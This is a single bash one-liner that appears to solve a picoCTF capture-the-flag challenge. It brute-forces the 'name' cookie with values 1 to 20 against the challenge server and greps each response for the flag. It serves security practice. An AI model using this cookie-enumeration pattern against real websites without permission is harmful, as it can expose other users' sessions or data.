for i in {1..20}; do echo "$i"; curl -s http://mercury.picoctf.net:6418/ -H "Cookie: name=$i" -L | grep -B 2 -A 2 -i CTF; done

